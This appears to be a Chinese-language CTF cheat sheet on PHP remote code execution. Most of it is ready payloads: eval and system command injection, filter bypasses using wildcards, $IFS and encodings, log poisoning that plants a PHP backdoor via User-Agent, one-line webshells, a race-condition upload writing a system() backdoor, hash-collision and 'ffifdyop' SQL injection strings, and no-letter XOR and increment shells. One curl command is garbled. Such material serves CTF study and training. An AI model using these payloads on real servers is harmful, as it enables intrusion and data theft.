
# 前言

RCE（Remote Code Execution，远程代码执行）漏洞是指攻击者通过漏洞，能够在目标系统上远程执行任意代码的安全漏洞。这种漏洞通常允许攻击者在受害主机上执行恶意命令，可能导致系统被完全控制，甚至可能被用来执行系统级操作，如删除文件、窃取敏感数据、安装恶意软件等。  

---

# 一. 命令执行函数

以下函数都应当在 `eval` 中执行

```php
error_reporting(0);   
if(isset($_GET['c'])){        
    $c = $_GET['c'];                
    eval($c);       
}else{    
    highlight_file(__FILE__);   
}
```

## 1.1 system函数命令执行

通过 `system` 函数执行操作系统的 `shell` 命令并输出结果

```c
?c=system("ls");
?c=system("tac flag.php");
```

## 1.2 passthru函数命令执行

`passthru` 与 `system` 类似

```c
?c=passthru("ls");
```

## 1.3 echo+反引号命令执行

用反引号执行 `shell` 命令，但反引号执行完命令不会自动输出，需要配合 `echo` 输出结果

```c
?c=echo `ls`;
?c=echo `tac flag.php`;
```

## 1.4 shell_exec函数命令执行

`shell_exec` 与反引号类似，只执行但不返回结果，需配合 `echo` 输出

```c
?c=echo shell_exec("ls");
?c=echo shell_exec("tac flag.php");
```

---

# 二. 常用命令

以下命令应当在命令执行函数中执行

## 2.0 phpinfo()测试命令执行

`phpinfo()` 命令广泛用于测试是否存在 RCE 漏洞，例如检验是否成功写入一句话木马，同时可观察到 `disable_functions` 项，帮助后续漏洞利用

```c
?c=phpinfo();
```

## 2.1 ls命令目录读取

```c
?c=ls;
```

## 2.2 cat命令文件读取

`cat` 命令读取文件内容，但结果不会显示在页面上（需要查看页面源代码）

```c
?c=cat flag.php
?c=/bin/cat flag.php
```

## 2.3 tac命令文件读取

```c
?c=tac flag.php
```

## 2.4 vi命令文件读取

```c
?c=vi flag.php
```

## 2.5 uniq命令文件读取

`uniq`函数的作用是删除文件重复行并输出剩余内容，可以用于文件读取。与`cat`一样，结果在源代码

```c
?c=uniq flag.php
```

## 2.6 base64命令读取文件

`base64` 命令可将文件内容进行编码后输出

```c
?c=base64 flag.php
?c=/bin/base64 flag.php
```

## 2.7 grep命令文件读取

`grep` 用于查询文件中包含指定字符串的行

```c
?c=grep 'fla' flag.php
```

## 2.8 sort命令排序输出

`sort`是一个排序命令，`sort filename`会将文件内容进行行间的排序并输出文本

```c
?c=sort flag.php
```

## 2.9 mv命令文件重命名

例如利用 `mv` 将 `flag.php` 的后缀名改为 txt 后直接访问 txt 文件

```c
?c=mv f?lg.php a.txt
```

## 2.10 cp命令文件内容复制

利用 `cp` 命令将 `flag.php` 的内容复制到 `1.txt` 文件中，再通过访问 `/1.txt` 读取文件内容  
注意：使用反引号执行命令时还是需要用 `echo` 输出

```c
?c=cp flag.php 1.txt

?c=echo `cp flag.php 1.txt`;
```

---

# 三. 文件名过滤

利用文件名过滤绕过技巧

## 3.1 `*`通配符绕过

```c
?c=system("tac fl*g.php");
?c=system("tac fl*");
```

## 3.2 `''`空字符匹配绕过

```c
?c=system("tac fla''g.php")
```

*说明：空字符串 `''` 可用来绕过某些字符过滤，`fla''g.php` 等价于 `flag.php`。*

## 3.3 `\`转义匹配绕过

```c
?c=system("tac fl\ag.php")
```

*说明：`\` 是 转义字符，通常用于转义后面的字符，在某些情况下，`fl\ag.php` 可能会被解释为 `flag.php`，即通过插入转义字符来避免直接匹配敏感词或绕过过滤*

## 3.4 `?`占位符绕过

```c
?c=system("tac f???????")
```

*说明：在很多操作系统的文件系统中，`?`被用作通配符，代表 任何单个字符。在 Linux 中，`f???????` 可以匹配任何以 `f` 开头并包含 7 个任意字符的文件名*

## 3.5 传参执行绕过

### 3.5.1 eval函数

```c
?c=eval($_GET[x]);&x=system("ls");
?c=eval($_GET[x]);&x=system("tac flag.php");
```

*`eval`函数执行任意php命令，这里利用`get`方式接受x参数，在传参中执行命令，而在这个`get`方式接受的参数并没有被过滤*
### 3.5.2 include函数

利用文件包含漏洞读取文件

```c
?c=include($_GET[x]);&x=php://filter/convert.iconv.UTF8.UTF16/resource=flag.php
```

*如果 `(` 和 `;` 被过滤， `%0a` 是 URL 编码中表示换行符（`\n`）的字符。从而使得 `include` 语句和 `$_GET[1]` 的处理被分开，从而绕过过滤机制，不过`include`函数这里不加`(`也是可以的
`php`遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是`php`文件中最后一句在`?>`前可以不写分号。*
```c
?c=include%0a$_GET[1]?>&1=php://filter/convert.iconv.UTF8.UTF16/resource=flag.php
?c=include$_GET[1]?>&1=php://filter/convert.iconv.UTF8.UTF16/resource=flag.php
```
### 3.5.3 日志包含

既然能够执行文件包含，那么也可以包含日志文件，日志文件中会记录你的`UA`头，假设我们在`UA`头中写入后门代码，然后我们包含日志文件，那么就能通过后门代码读取文件，
```
http://576f2421-5308-45ef-9c2e-17454de9e09a.challenge.ctf.show/?c=include$_GET[1]?%3E&1=../../../../var/log/nginx/access.log
```
注意：需使用 http 协议，因为使用 https 时可能因 SSL 证书问题无法连接。

在请求中，把后门代码写入 User-Agent，如：
```php
?c=include$_GET[1]?>&1=../../../../var/log/nginx/access.log  
User-Agent:<?php eval($_POST['x']);?>
```

## 3.6 变量作用域劫持攻击

利用变量作用域劫持实现命令执行：
```c
?c=eval(array_pop(next(get_defined_vars())));
POST:
	1=system('tac fl*');    
```
### 3.6.1 函数解释
- `get_defined_vars()`
获取当前作用域中所有定义的变量，返回一个数组，键是变量名，值是对应的变量值。
- `next(get_defined_vars())`
将指针移动到数组中的下一个元素，并返回该元素的值。在这里，指针操作的对象是由 get_defined_vars() 返回的数组。
- `array_pop(...)`
弹出数组的最后一个元素。这里作用在 `next(get_defined_vars())` 的结果上，获取这个数组的最后一个变量值。
### 3.6.2 攻击流程
- 攻击者通过 `POST` 请求传入 `1=system('tac fl*');`，在服务器端该数据被存储为变量。
- `array_pop(next(get_defined_vars()))` 获取该变量值，即 `system('tac fl*')`。
- `eval()` 动态执行，触发 `system('tac fl*')`，攻击者能够获取敏感文件内容。

## 3.7 函数嵌套文件枚举

- `getcwd()` 函数返回当前工作目录的路径。
- `scandir()` 函数列出指定目录中的所有文件和目录，并返回一个包含文件和目录名称的数组。
- `show_source()`函数用于显示一个 `PHP` 文件的源代码
通过这三个函数，拼接出了`flag.php`文件，并使用`show_source`输出。这里的`[2]`要多尝试，`flag`文件的位置不一定会在第2位
```c
?c=show_source(scandir(getcwd())[2]);
```

## 3.8 函数嵌套文件读取

当 `[]` 被过滤时，利用指针操作函数读取特定文件  
读取最后一个文件：
```c
?c=show_source(current(array_reverse(scandir(getcwd()))));
```
读取倒数第二个文件：
```c
?c=show_source(next(array_reverse(scandir(getcwd()))));
```
还可以用下面的方法得到目录：
```c
?c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));
?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```
---

# 四. 空格过滤

采用 URL 编码和其它技巧绕过空格过滤

## 4.1 `%20` 空格绕过
是 URL 编码的空格
```c
?c=system("tac%20flag.php")
```

## 4.2 `%09` 空格绕过
`%09`是 URL 编码中的水平制表符（Tab，ASCII 码为 9），它的作用是将 `tac` 后面的 `fla*` 和前面的部分隔开，通常它不会影响命令的执行，只是空格的替代。
```c
?c=system("tac%09flag.php");
```

## 4.3 `$IFS$9` 空格绕过
`$IFS` 是一个特殊的环境变量，表示 Internal Field Separator（内部字段分隔符），默认情况下，`$IFS` 的值包含空格、制表符和换行符。`$9`是命令行参数的占位符之一，会被解析为空字符串。两者结合可以起到空格的作用
```c
?c=system("tac$IFS$9flag.php");
```

## 4.4 `${IFS}` 绕过

```c
?c=system("tac${IFS}flag.php")
```

## 4.5 `<` 输入重定向符绕过
`<` 是 输入重定向符号，用于将文件内容作为命令的输入，可以用于空格绕过。
```c
?c=system("tac<fla*");
```

## 4.6 '_'替换绕过


当 PHP 把 URL 的 query string 解析成 `$_GET` 时，它会做一些“转换”：

* `.` (点) → 转换成 `_`
* 空格（包括 `%20` 和 `+`） → 转换成 `_`

也就是说，URL 参数的名字里如果有 `.`、` `、`+`，PHP 都会自动替换成下划线 `_`。

---

在 [PHP 手册](https://www.php.net/manual/en/language.variables.external.php) 里写得很清楚：

> Dots and spaces in variable names are converted to underscores.
> 变量名里的点和空格会被转为下划线。

所以就会有下面的这种情况：

```
?NI+SA+=txw4ever
```

* 原始 query：`NI+SA+`
* PHP 解析：

  * `+` → 空格
  * 空格 → `_`

所以最终得到：

```
$_GET['NI_SA_'] = "txw4ever";
```

也就能够绕过针对_的黑名单过滤

---

# 五. 命令过滤

## 5.1 `''` 空字符匹配绕过
和文件名绕过一样，空字符串的可以用于绕过某些函数的过滤，`ta''c` 等价于 `tac`
```c
?c=system("ta''c flag.php")
```

## 5.2 `\` 匹配绕过
`\`是 转义字符，通常用于转义后面的字符，在某些情况下，`ta\c` 可能会被解释为 `tac`，即通过插入转义字符来避免直接匹配敏感词或绕过过滤
```c
?c=system("ta\c flag.php")
```

## 5.3 命令文件+`?`绕过

`cat`命令所在的路径是在`/bin/`目录下，所以这里相当于直接调用了`cat`文件执行命令，这里的`cat`可以看作命令，也是一个文件，所以通配符可以用在这上面，如果`bin`被过滤了也可以用通配符
记得`cat`要看源代码
```c
?c=/bin/c?t flag.php
?c=/?in/c?t flag.php
```

同理，`base64` 命令也可如此操作：
```c
?c=/bin/ba?e64 flag.php
```

## 5.4 换用其他命令

在第一部分有这么多函数，说不定有些没被过滤呢

---

# 六. 字母过滤

## 6.1 base64 命令文件执行示例

```c
?c=/bin/base64 flag.php
?c=/???/????64 ????.???
?c=echo "Y2F0IGZsYWcucGhw" | base64 -d | bash    //cat flag.php 后面的bash可以替换为sh
```

## 6.2 利用数字ASCII码代替字母

利用 Bash 的 `$'…'` 语法实现，例如：
```c
?c=$'\154\163'      ls

?c=$'\143\141\164'*     cat *

?c=$'\164\141\143' $'\146\154\141\147\56\160\150\160'      tac flag.php
```

下面的 Python 脚本可以实现八进制编码与解码：

```python
def encode_to_octal(input_string):
    # 将每个字符转换为其ASCII码的八进制表示
    return ''.join(f'\\{oct(ord(c))[2:]}' for c in input_string)

# 测试
input_string = "cat"
encoded_string = encode_to_octal(input_string)
print(f"Encoded: {encoded_string}")

def decode_from_octal(octal_string):
    # 分割八进制字符串，并将每个八进制值转换为字符
    characters = octal_string.split('\\')[1:]  # 去掉空字符串部分
    decoded_string = ''.join(chr(int(c, 8)) for c in characters)
    return decoded_string

# 测试
octal_string = "\\143\\141\\164"
decoded_string = decode_from_octal(octal_string)
print(f"Decoded: {decoded_string}")
```
## 6.3 hex编码绕过

```c
echo "63617420666c61672e706870" | xxd -r -p | bash 
```
效果思路和 base64 类似

---

# 七. 命令执行函数过滤

题目仅有一层 `eval`，而用于执行命令的函数均被过滤，下面介绍仅通过函数组合而不借助任何命令实现目录与文件读取的方法。

原代码示例：
```php
if(isset($_POST['c'])){
    $c = $_POST['c'];
    eval($c);  
}else{
    highlight_file(__FILE__);   
}
```

## 7.1 函数嵌套目录读取

### 7.1.1 自根目录向下读取目录

```c
c=print_r(scandir("/"));
c=print_r(scandir("/var"));
c=print_r(scandir("/var/www"));
c=print_r(scandir("/var/www/html"));
```

### 7.1.2 自当前目录向上读取目录

```c
c=print_r(scandir(dirname(__FILE__)));         // 读取当前目录
c=print_r(scandir(dirname(__DIR__)));          // 读取上级目录
c=print_r(scandir(dirname(dirname(__FILE__))));  // 读取上级目录
c=print_r(scandir(dirname(dirname(__DIR__))));   // 读取上上级目录
c=print_r(scandir(dirname(dirname(dirname(dirname(__DIR__))))));
```

或者使用 `glob` 函数：
```c
c=var_export(glob('*'));
c=var_export(glob('../*'));
c=var_export(glob('../../*'));
c=var_export(glob('../../../*'));
```

## 7.2 include函数文件读取

### 7.2.1 直接包含输出文件

```c
c=include("flag.php"); echo $flag;

c=include("../../../../../flag.txt"); echo $flag;

c=include("/flag.txt"); echo $flag;
```

### 7.2.2 伪协议文件读取

使用 `php://filter` 伪协议：
```c
c=include "php://filter/convert.iconv.UTF8.UTF16/resource=flag.php";

c=include "php://filter/convert.iconv.UTF8.UTF16/resource=../../../../../flag.txt";

c=include "php://filter/convert.iconv.UTF8.UTF16/resource=/flag.txt";

?c=include($_GET[x]);&x=php://filter/convert.iconv.UTF8.UTF16/resource=flag.php
```

另有 `php://input` 及 `data://` 伪协议方法。

### 7.2.3 日志包含

可尝试包含日志文件，示例：
```c
?c=include(../../../var/log/nginx/access.log)
```

在请求中，在 UA 头中植入后门代码：
```php
<?php eval($_POST['x']);?>
```

### 7.2.3 针对文件包含的过滤

利用传参的方式实现伪协议绕过。

## 7.3 highlight函数文件读取

```c
c=highlight_file("flag.php");
c=highlight_file("../../../../../flag.txt");
c=highlight_file("/flag.txt");
```

## 7.4 show_source函数文件读取

```c
c=show_source("flag.php");
c=show_source("../../../../../flag.txt");
c=show_source("/flag.txt");
```

## 7.5 readgzfile函数文件读取

```c
c=readgzfile("flag.php");
c=readgzfile("../../../../../flag.txt");
c=readgzfile("/flag.txt");
```

## 7.6 require_once函数文件读取

```c
c=require_once('/flag.txt');
```

## 7.7 函数嵌套文件枚举

```c
c=show_source(scandir(getcwd())[2]);
```

## 7.8 函数嵌套文件读取

利用指针操作读取特定文件  
读取最后一个文件：
```c
c=show_source(current(array_reverse(scandir(getcwd()))));
```
读取倒数第二个文件：
```c
c=show_source(next(array_reverse(scandir(getcwd()))));
```
或者：
```c
c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));
c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```

---

# 八. 缓冲区劫持

当使用函数和命令组合读取目录与文件时，输出会先进入缓冲区，以下方法可绕过缓冲区劫持：

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
if(isset($_POST['c'])){
    $c = $_POST['c'];
    eval($c);
    $s = ob_get_contents();
    ob_end_clean();
    echo preg_replace("/[0-9]|[a-z]/i", "?", $s);
}else{
    highlight_file(__FILE__);
}
?>
```

## 8.1 提前送出缓冲区

例如：
```c
c=var_export(scandir('/')); ob_flush();
c=include('/flag.txt'); ob_flush();
c=readgzfile("/flag.txt"); ob_flush();
```

## 8.2 提前终止程序

利用 `exit()` 或 `die()` 强制结束脚本并刷新缓冲区：
```c
c=var_export(scandir('/')); exit();
c=include('/flag.txt'); die();
c=readgzfile("/flag.txt"); die();
```

---

# 九. 命令分隔符

利用命令分隔符注入多条命令，示例代码如下：

```php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    system($c . " >/dev/null 2>&1");   
}else{
    highlight_file(__FILE__);   
}
```

## 9.1 命令分隔符说明

- **`;`** 分号：分隔多条命令，前面的命令执行后，后面的命令也会执行。
- **`|`** 管道符：将前一条命令的输出作为后一条命令的输入。
- **`||`** 逻辑或：仅当前一命令失败时才执行后一条命令。
- **`&`**：在 URL 中是保留字符，需用 `%26` 表示。
- **`&&`** 逻辑与：仅当前一条命令成功后才执行下一条命令。
- **`%0a`**：URL 编码中的换行符，也可用作命令分隔符。

以下是示例 Payloads：

```c
?c=ls;ls
?c=tac flag.php;ls

?c=ls||
?c=tac flag.php||  

?c=ls%26
?c=tac flag.php%26  

?c=ls%26%26
?c=tac flag.php%26%26

?c=ls%0a
?c=tac flag.php%0a
```

---

# 十. 逻辑绕过
## 10.1 关于md5()和sha1()的常见绕过

常见题型：要求传入两个参数不相等但是经过md5加密后需要相等

### 10.1.1 使用数组绕过
对于`php`强比较和弱比较：`md5()`，`sha1()`函数无法处理数组，如果传入的为数组，会返回`NULL`，两个数组经过加密后得到的都是`NULL`，也就是相等的。



*传入两个不同的数组，经`md5`加密后结果都是`null`，弱比较`==`则相等*
```c
URL/?a[]=1&b[]=2
```

### 10.1.2  使用特殊字符串绕过

对于某些特殊的字符串加密后得到的密文以`0e`开头，`PHP`会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同。
常见的加密后密文以`0e`开头的字符串:
```c
md5：

0e215962017=0e291242476940776845150308577824 //开头均为0e，弱比较相等
 
240610708:0e462097431906509019562988736854
QLTHNDT:0e405967825401955372549139051580
QNKCDZO:0e830400451993494058024219903391
PJNPDWY:0e291529052894702774557631701704
NWWKITQ:0e763082070976038347657360817689
NOOPCJF:0e818888003657176127862245791911
MMHUWUV:0e701732711630150438129209816536
MAUXXQC:0e478478466848439040434801845361
byGcY
sonZ7y
aabg7XSs
aabC9RqS
s878926199a
s155964671a
s214587387a
s1091221200a
 
 //注意这里如果是进行的弱比较==，就会出现md5加密后的结果相同
 // 因为0e会被自动回归为0
 // 但是如果是===强比较的话就会出现不相等的情况
 // 因为强比较不做类型转换，直接按字符串逐字节进行比较。
 
sha1：
 
10932435112: 0e07766915004133176347055865026311692244
aaroZmOk: 0e66507019969427134894567494305185566735
aaK1STfY: 0e76658526655756207688271159624026011393
aaO8zKZF: 0e89257456677279068558073954252716165668
aa3OFF9m: 0e36977786278517984959260394024281014729
0e1290633704: 0e19985187802402577070739524195726831799
```

*随便选取两个加密后是以`0e`开头的字符串传入即可*

```c
URL/?a=240610708&b=QLTHNDT
```

#### 10.1.2.1  强比较===，禁数组绕过：

md5:
```php
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

```sh
curl -X POST "http://node5.anna.nssctf.cn:27504/level_2_1s_h3re.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2"

response:Level___3.php
```


sha1:
```php
%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1

%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
```

```sh
curl -X POST "http://node5.anna.nssctf.cn:275 4/Level___3.php"   -H "C
ontent-Type: application/x-www-form-urlencoded" 25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1"

level_level_4.php
```




### 10.1.3 混合使用
过滤如下：
```php
$a = $_GET["param1"];
$b = $_POST["param2"];
$c = $_GET["param3"];
$d = $_POST["param4"];

if($a==$b && md5($a)==md5($b) && $c!=$d && sha1($c)==sha1($d)){
    if(gettype($a)=='array' && gettype($c)=='array'){
        die("Oh.. no..");
}
    echo getenv("FLAG");
    echo " xiu_er_!!";

}else{
    echo "fail";
}
```
那么将其中一组改为特殊字符串，绕过其逻辑匹配，
```c
GET:
URL/?param1[]=1&param3=10932435112

POST:
URL/?param2[]=3&param4=aaroZmOk
```
### 10.1.3 md5($pass,true)与sql注入

`md5($pass,true)`
PHP 中的 `md5()` 函数在第二个参数为 `true` 时会将 `MD5` 哈希结果以二进制数据的形式进行返回，因 `MD5` 函数的返回值类型为字符串，故在返回结果前，二进制数据将使用 `ASCII` 进行 解码（二进制数据到文本字符的转化）

对于下面的这种情况：
```sql
SELECT * FROM data WHERE username = 'admin' and password ='" . md5($user_input, true)
```

可以使用下面的这个字符串绕过：
```
ffifdyop
```
其对应的字符串为：
```sql
'or'6�]��!r,��b
```
相当于`select * from admin where password=’'or 1` 实现 sql 注入
## 10.2 strcmp绕过

`strcmp`是比较两个字符串，如果`str1<str2` 则返回`<0` ，如果`str1`大于`str2`则返回`>0` ，如果两者相等则返回`0`。

`strcmp`比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值`0`，正是利用这点进行绕过。

*传入非字符串类型，比如数组，进行绕过*
```c
URL/?a[]=1
```

## 10.3 switch绕过

对于传入的参数`0`和`1`，会有额外的`bool`比较

```php
<?php
$a = 0;
switch ($a) {
    case $a <= 10:
            echo '小于10';
        break;
 
    case $a > 20:
            echo '大于20';
        break;
 
    default:
        	echo '大于30';
        break;
}
```
在上面的代码中，输出的结果为 `大于20`
因为`a`先与`10`比较，返回`true`，但是`0`表示`false`，`false!=true`,所以进入下一个`case`，`0>20`返回`false`，`false==false`，成立

## 10.4 intval绕过

`intval()` 函数用于获取变量的整数值
```php
echo intval(53);                      // 53
echo intval(5.3);                     // 5
```
关于intval这个函数存在一个漏洞:
```php
echo intval(1e10);                    // 1410065408
echo intval('1e10');                  // 1
```
单引号传值的时候，它只识别字母前面连续的数字，当我们进行`GET`传参时，其实就是默认加单引号的，在`PHP`中，`+`号会被判定成把他强制转换成科学计数法进行计算，而不是一个字符串`+1`,即变为`1e10+1`而不是`'1e10'+1`。

---
# 十一. 文件绕过
## 11.1 常用脚本

### 11.1.1 一句话木马
```php
<?php @eval($_POST['123']);?>
```
### 11.1.2 将图片文件作为 php 执行
```php
<FilesMatch "\.gif">
SetHandler application/x-httpd-php
</FilesMatch>	
```
当请求的文件扩展名为 `.jpg` 时，服务器不会将其作为普通的图片文件直接传输给客户端，而是会当作 PHP 脚本进行解析和执行，需要搭配图片藏码使用









## 11.2 条件竞争

上传的文件有时会先被放到一个目录中，然后再对这个目录进行扫描检查，删除不符合要求的文件。

这种情况下可以通过多线程请求去在上传的文件被删除前访问文件，尤其是对于 php 直接访问等于执行，可以在安全目录下生成一个后门文件，实现 RCE

初次上传的脚本如下，可以在指定位置生成一个`succ.php`文件

```php
<?php file_put_contents('succ.php', '<?php system($_GET["cmd"]); ?>'); ?>
<?php file_put_contents('succ.php', '<?php @eval($_POST['cmd']);?>'); ?>
```


---
# 十二. 无字母/数字RCE

PHP由于弱类型这个特性，`true`的值为`1`，故`true+true==2`，也就是 `(’>’>’<’)+(’>’>’<’)==2`
```php
<?php
echo (">">"<")."\n";     //1
echo('>'>'<')+('>'>'<'); //2
?>  
```


## 12.1 取反绕过
**只适用于PHP7**
对想要传入的参数，先进行URL编码再取反
例如传入构造一个phpinfo();
```php
<?php
echo urlencode(~'phpinfo'); //%8F%97%8F%96%91%99%90
?>
GET:
URL/?shell=(~%8F%97%8F%96%91%99%90)();

```

或者如下面这种情况没有过滤掉`()`时:
```php
<?php
$a="system";
$b = "cat /f*";

echo urlencode(~$a)."\n"; 
echo urlencode(~$b);
// (~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0)
?>

GET：
URL/shell=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0)
```

这里提交的 GET 参数实际上是经过 URL 编码的，这样即使编码串中包含字母，也是在表示一个字节（例如 %8C 表示 0x8C），而不是直接的字母字符 当 PHP 接收到参数时，会先进行 URL 解码，恢复成原始的字节序列（例如 0x8C, 0x86, …），这时这些字节不属于常规的 ASCII 字母范围 因此，严格过滤字母的正则判断是在对解码后的数据检查，结果不会因为 URL 编码后的 A–F 而被触发过滤
## 12.2 异或绕过：
一个字符转换为ascll码后对应的数字转为2进制表示，按位异或，得到新的字符；异或的规则为相同为0，不同为1
比如下面的这个例子，不用字母构建出命令：
```php
$__=("#"^"|"); // _
$__.=("."^"~"); // _P
$__.=("/"^"`"); // _PO
$__.=("|"^"/"); // _POS
$__.=("{"^"/"); // _POST 
$$__[_]($$__[__]); // $_POST[_]($_POST[__]);
```
写到一行后进行url编码：
```php
$__=("#"^"|");$__.=("."^"~");$__.=("/"^"`");$__.=("|"^"/");$__.=("{"^"/");$$__[_]($$__[__]);

%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B
```

## 12.3 递增递减运算符绕过

当我们通过某种方法可以得到一个字符时，我们就可以通过自增来获取其他字符

比如下面的这个过程由一个空的列表获取字符，并通过自加来获得其他的字符：

```php
<?php
$_=[].'';//Array
$_=$_[''=='$'];//A
$_++;//B
$_++;//C
$_++;//D
$_++;//E
$__=$_;//E
$_++;//F
$_++;//G
$___=$_;//G
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T
$_=$___.$__.$_;//GET
//var_dump($_);
$_='_'.$_;//_GET
var_dump($$_[_]($$_[__]));
//$_GET[_]($_GET[__])
```

同样将其写为一行，并进行url编码：
```php
$_=[].'';$_=$_[''=='$'];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_='_'.$_;$$_[_]($$_[__]);

